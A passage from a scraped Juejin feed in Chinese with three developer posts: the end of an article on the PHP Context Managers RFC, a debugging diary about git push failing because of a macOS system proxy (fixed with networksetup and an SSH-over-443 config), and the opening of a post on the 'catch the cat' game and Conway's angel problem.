<p><strong>重要</strong>：后面的管理器会先执行清理。在上面的例子中，<code>Bar</code> 的 <code>exitContext()</code> 会先于 <code>Foo</code> 的 <code>exitContext()</code> 执行，这符合 LIFO（后进先出）的资源管理原则。</p>
<h3 data-id="heading-18">Resource 自动包装</h3>
<p>由于 PHP 中的资源（resource）类型尚未完全对象化（如 <code>fopen()</code> 返回的文件句柄），RFC 特别为资源提供了自动包装机制。</p>
<p>当 <code>using</code> 表达式返回一个资源类型时，会自动包装成一个内置的 Context Manager：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-comment">// 这段代码</span>
<span class="hljs-title function_ invoke__">using</span> (<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">'foo.txt'</span>, <span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$fp</span>) {
    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-string">'bar'</span>);
}

<span class="hljs-comment">// 会自动转换为</span>
<span class="hljs-title function_ invoke__">using</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceContext</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">'foo.txt'</span>, <span class="hljs-string">'r'</span>)) <span class="hljs-keyword">as</span> <span class="hljs-variable">$fp</span>) {
    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-string">'bar'</span>);
}
</code></pre>
<p>其中 <code>ResourceContext</code> 大致等价于：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ResourceContext</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ContextManager</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-keyword">private</span> <span class="hljs-variable">$resource</span></span>) </span>{}

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">enterContext</span>(<span class="hljs-params"/>): <span class="hljs-title">mixed</span>
    </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;resource;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exitContext</span>(<span class="hljs-params">?\<span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$e</span> = <span class="hljs-literal">null</span></span>): ?<span class="hljs-title">bool</span>
    </span>{
        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_resource</span>(<span class="hljs-variable">$this</span>-&gt;resource)) {
            <span class="hljs-title function_ invoke__">close</span>(<span class="hljs-variable">$this</span>-&gt;resource); <span class="hljs-comment">// C 层面的统一关闭函数</span>
        }
    }
}
</code></pre>
<p>这样即使在资源完全对象化之前，也能享受 Context Managers 带来的便利。</p>
<h2 data-id="heading-19">设计决策</h2>
<h3 data-id="heading-20">为何选择 <code>using</code> 而非 <code>with</code></h3>
<p>最初的提案使用 <code>with</code> 关键字（与 Python 一致），但发现 Laravel 在全局助手函数中定义了一个名为 <code>with()</code> 的函数。引入 <code>with</code> 关键字会导致所有 Laravel 应用在升级到 PHP 8.6 时立即不兼容，这是不可接受的。</p>
<p>经过调研发现，<code>using</code> 在 Packagist 前 14000 个包中仅出现 2 次（相比之下 <code>with</code> 出现 19 次）。C# 也使用 <code>using</code> 实现类似（但功能较弱）的特性。因此最终选择了 <code>using</code> 关键字。</p>
<h3 data-id="heading-21">为何不使用析构函数</h3>
<p>有人可能会想，为什么不直接使用对象的构造函数和析构函数来实现"进入"和"退出"逻辑呢？这种方案存在以下问题：</p>
<ol>
<li><strong>无法分离管理器和变量</strong>：无法区分管理对象和实际使用的对象</li>
<li><strong>无法区分成功/失败</strong>：析构函数不接受参数，无法知道是正常退出还是异常退出</li>
<li><strong>时机不可控</strong>：析构函数的调用时机不确定，可能因为变量被其他地方引用而延迟执行</li>
<li><strong>顺序问题</strong>：在垃圾回收期间，析构函数的调用顺序是不确定的</li>
</ol>
<p>因此，RFC 采用了显式的接口设计。</p>
<h2 data-id="heading-22">影响和展望</h2>
<h3 data-id="heading-23">向后兼容性</h3>
<ul>
<li>引入了新的全局接口 <code>ContextManager</code></li>
<li>引入了新的半保留关键字 <code>using</code>（禁止用于全局常量和函数，但方法和类常量仍可使用）</li>
</ul>
<p>由于全局命名空间通常被认为是 PHP 内部保留的，预计不会有重大兼容性问题。</p>
<h3 data-id="heading-24">生态系统影响</h3>
<p>Context Managers 作为一个通用的"设置-清理"抽象，未来的 PHP API 设计可能会考虑提供相应的 Context Manager，而不是引入新的语法糖。</p>
<p>例如：</p>
<ul>
<li>数据库库可能提供事务 Context Manager</li>
<li>HTTP 客户端可能提供连接池 Context Manager</li>
<li>日志库可能提供上下文级别配置 Context Manager</li>
</ul>
<h3 data-id="heading-25">未来可能性：Generator 装饰器</h3>
<p>Python 允许使用生成器（generator）和装饰器来创建 Context Manager，使语法更简洁。PHP 也验证了类似实现的可行性：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">#[ContextManager</span><span class="hljs-meta">]</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">opening</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>) </span>{
    <span class="hljs-variable">$f</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">"r"</span>);
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$f</span>) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">"fopen(<span class="hljs-subst">$filename</span>) failed"</span>);
    }
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">yield</span> <span class="hljs-variable">$f</span>;
    } <span class="hljs-keyword">finally</span> {
        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$f</span>);
    }
}

<span class="hljs-title function_ invoke__">using</span> (<span class="hljs-title function_ invoke__">opening</span>(<span class="hljs-keyword">__FILE__</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) {
    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$f</span>);
}
</code></pre>
<p>不过当前 RFC 认为对象形式已经足够，这个特性被列为未来可能的增强。</p>
<h2 data-id="heading-26">总结</h2>
<p>PHP Context Managers 为资源生命周期管理提供了一种优雅且统一的解决方案。通过 <code>using</code> 关键字和 <code>ContextManager</code> 接口，开发者可以：</p>
<ul>
<li><strong>减少样板代码</strong>：不再需要为每个资源操作编写重复的 try-finally 逻辑</li>
<li><strong>提高代码可靠性</strong>：保证清理代码一定会执行，即使发生异常</li>
<li><strong>提升可读性</strong>：业务逻辑更清晰，不再被资源管理细节干扰</li>
<li><strong>促进代码复用</strong>：将通用的资源管理模式封装成可复用的 Context Manager</li>
</ul>
<p><strong>适用场景</strong>：</p>
<ul>
<li>文件操作</li>
<li>数据库事务</li>
<li>锁管理</li>
<li>临时配置修改</li>
<li>异步任务管理</li>
<li>任何需要"设置-使用-清理"模式的场景</li>
</ul>
<p>Context Managers 将随 <strong>PHP 8.6</strong> 发布，目前处于讨论阶段。如果你对此特性感兴趣，可以关注 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwiki.php.net%2Frfc%2Fcontext_managers" target="_blank" title="https://wiki.php.net/rfc/context_managers" ref="nofollow noopener noreferrer">RFC 讨论</a> 和 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Farnaud-lb%2Fphp-src%2Fpull%2F26" target="_blank" title="https://github.com/arnaud-lb/php-src/pull/26" ref="nofollow noopener noreferrer">实现代码</a>。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[踩坑日记：为什么Git 突然 Push 不上去了]]></title>    <link>https://juejin.cn/post/7575112613777899554</link>    <guid>https://juejin.cn/post/7575112613777899554</guid>    <pubDate>2025-11-23T07:28:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575112613777899554" data-draft-id="7575106644499087394" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="踩坑日记：为什么Git 突然 Push 不上去了"/> <meta itemprop="keywords" content="GitHub,Git,SSH"/> <meta itemprop="datePublished" content="2025-11-23T07:28:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小Lu的日常"/> <meta itemprop="url" content="https://juejin.cn/user/2585689638569422"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            踩坑日记：为什么Git 突然 Push 不上去了
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2585689638569422/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小Lu的日常
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T07:28:34.000Z" title="Sun Nov 23 2025 07:28:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>今天在开发的时候遇到一个很离谱的问题，git push 明明昨天还好好的，结果今天突然完全推不上去。</p>
<p>报错信息如下：</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">ERROR:</span> no healthy upstream
<span class="hljs-symbol">fatal:</span> Could <span class="hljs-built_in">not</span> read <span class="hljs-keyword">from</span> remote repository.

Please make sure you have the correct access rights
<span class="hljs-built_in">and</span> the repository exists.
</code></pre>
<p>或者是</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">ERROR:</span> upstream connect <span class="hljs-keyword">error</span> <span class="hljs-built_in">or</span> disconnect/reset before headers.
remote connection failure, transport failure reason: delayed connect <span class="hljs-keyword">error</span>: Connection refused
<span class="hljs-symbol">fatal:</span> Could <span class="hljs-built_in">not</span> read <span class="hljs-keyword">from</span> remote repository.
</code></pre>
<p>一开始我以为是 GitHub 挂了，或者我 SSH key 失效了。结果一切正常：</p>
<pre><code class="hljs language-vbnet" lang="vbnet">ssh -T git@github.com

Hi shenlu89! You<span class="hljs-comment">'ve successfully authenticated, but GitHub does not provide shell access.</span>
</code></pre>
<p>我又查了一下远端Git仓库的URL是否正确：</p>
<pre><code class="hljs language-scss" lang="scss">git remote -v 
origin  git<span class="hljs-keyword">@github</span>.<span class="hljs-attribute">com</span>:shenlu89/docs.git (fetch)
origin  git<span class="hljs-keyword">@github</span>.<span class="hljs-attribute">com</span>:shenlu89/docs.git (push)
</code></pre>
<p>SSH 连接没有问题</p>
<ul>
<li>仓库地址没错</li>
<li>SSH 授权正常</li>
<li>git remote -v 正常</li>
</ul>
<p>那问题从哪里来？</p>
<p>正常来说，使用 SSH 方式 push，那只要 ssh -T 可用，push 一定可用，但我这里：</p>
<pre><code class="hljs language-java" lang="java">ssh -T git<span class="hljs-meta">@github</span>.com   <span class="hljs-comment">// 正常</span>
git push                <span class="hljs-comment">// 失败</span>
</code></pre>
<p>这说明 push 底层不是简单的 SSH 问题，而是 连接被代理或网络干扰了。</p>
<p>继续排查 macOS 系统代理：</p>
<pre><code class="hljs language-arduino" lang="arduino">networksetup -getwebproxy <span class="hljs-string">"Wi-Fi"</span>
networksetup -getsocksfirewallproxy <span class="hljs-string">"Wi-Fi"</span>
</code></pre>
<p>结果是：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">Enabled:</span> <span class="hljs-literal">Yes</span>
<span class="hljs-attr">Server:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>
<span class="hljs-attr">Port:</span> <span class="hljs-number">7890</span>
</code></pre>
<p>也就是说，macOS 系统级 HTTP/HTTPS/SOCKS 都指向了 127.0.0.1:7890。</p>
<p>这就导致所有 Git 连接走系统代理，系统代理为空，请求被直接拒绝，Git push 报 connection refused</p>
<p>这就是为什么 SSH 测试能连，但 git push 反而失败。</p>
<p>因为 SSH 测试命令不走系统代理，而 Git push 走了。</p>
<p>直接关掉 macOS 的代理即可：</p>
<pre><code class="hljs language-vbnet" lang="vbnet">networksetup -setwebproxystate <span class="hljs-string">"Wi-Fi"</span> <span class="hljs-keyword">off</span>
networksetup -setsecurewebproxystate <span class="hljs-string">"Wi-Fi"</span> <span class="hljs-keyword">off</span>
networksetup -setsocksfirewallproxystate <span class="hljs-string">"Wi-Fi"</span> <span class="hljs-keyword">off</span>
</code></pre>
<p>然后：</p>
<pre><code class="hljs language-perl" lang="perl">git <span class="hljs-keyword">push</span>
</code></pre>
<p>瞬间恢复正常。</p>
<p>还有一种方法，就是将 GitHub SSH 改用 443 端口，为了兼容各种奇怪网络环境（公司、学校、酒店 WiFi 等），我顺手也把 GitHub SSH 通道改到了 443 端口，编辑 ~/.ssh/config：</p>
<pre><code class="hljs language-bash" lang="bash">Host github.com
    HostName ssh.github.com
    Port 443
    User git
    IdentityFile ~/.ssh/id_ed25519
    IdentitiesOnly <span class="hljs-built_in">yes</span>
</code></pre>
<p>443 端口一般不会被封，也不受代理影响，比 22 端口稳定太多。</p>
<p>这样问题就成功解决了。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[围小猫秘籍]]></title>    <link>https://juejin.cn/post/7575162322239979520</link>    <guid>https://juejin.cn/post/7575162322239979520</guid>    <pubDate>2025-11-23T08:21:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575162322239979520" data-draft-id="7575162322239963136" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="围小猫秘籍"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-11-23T08:21:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="青青子衿悠悠我心"/> <meta itemprop="url" content="https://juejin.cn/user/4383112851623134"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            围小猫秘籍
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4383112851623134/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    青青子衿悠悠我心
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T08:21:37.000Z" title="Sun Nov 23 2025 08:21:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h4 data-id="heading-0">在线游戏 <a href="https://link.juejin.cn?target=https%3A%2F%2Fc.getline.cloud%2F" target="_blank" title="https://c.getline.cloud/" ref="nofollow noopener noreferrer">c.getline.cloud/</a></h4>
<h4 data-id="heading-1">社区代码 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fwenyang0%2Fphaser-catch-the-cat" target="_blank" title="https://github.com/wenyang0/phaser-catch-the-cat" ref="nofollow noopener noreferrer">github.com/wenyang0/ph…</a></h4>
<h2 data-id="heading-2">围住一只猫猫需要几步？</h2>
<p>今天要讲的游戏叫做<strong>围小猫</strong>，2021年底在朋友圈里着实是火了一把，如果你还没有玩过，可以在搜索引擎中搜索“围小猫”。记忆力好的读者可能会记得，这款游戏并不是第一次火了，没错，它就是2014年曾在朋友圈大火过的“<strong>围住神经猫</strong>”的新皮肤！其原型可以追溯到更早。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/50d89ac7f601408fb93618e7c043c26e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S6Z2S5a2Q6KG_5oKg5oKg5oiR5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764490897&amp;x-signature=Qsl3%2FrBH4GfLzZEmIqnodG%2F5sXo%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-3">游戏介绍</h3>
<p>首先介绍一下游戏规则。</p>
<ul>
<li><strong>初始状态</strong>：小猫位于棋盘中心，6-8个障碍物会被预先随机放置在地图上。</li>
<li><strong>我方行动</strong>：每次点击小圆点就可以在该处放置一个障碍物。</li>
<li><strong>猫猫行动</strong>：小猫也会向地图边缘移动一格。</li>
<li><strong>胜负判定</strong>：
<ul>
<li><strong>胜利</strong>：猫猫被障碍物围住。</li>
<li><strong>失败</strong>：猫猫到达地图边缘溜走。</li>
</ul>
</li>
</ul>
<p>这样不断重复下去，直到游戏结束。</p>
<p>初上手的时候你会发现，这个游戏并不简单，几乎很难成功。因为棋盘其实并不大，猫只需要5步就可以跑出棋盘边界，很难将小猫堵住。</p>
<p>那么一个自然而然的问题是：<strong>如果棋盘足够大，可以保证将小猫堵住吗？</strong> 在回答这个问题之前，请让我先介绍一下“天使问题”。</p>
<h3 data-id="heading-4">天使问题</h3>
<p>天使问题首次见于1982年出版的《Winning Ways》一书，由书作者数学家<strong>约翰·H·康威</strong>（John H. Conway）提出。这是一个双方玩家分别扮演天使和恶魔的博弈游戏。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b22fb76a8d2a4b5ca01291480a98fb5a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S6Z2S5a2Q6KG_5oKg5oKg5oiR5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764490897&amp;x-signature=YFvnMhhKAH5wq%2B7TVKiFFNmSyFM%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li><strong>棋盘</strong>：游戏在一个无限大方格棋盘上进行，起始棋盘是空的。</li>
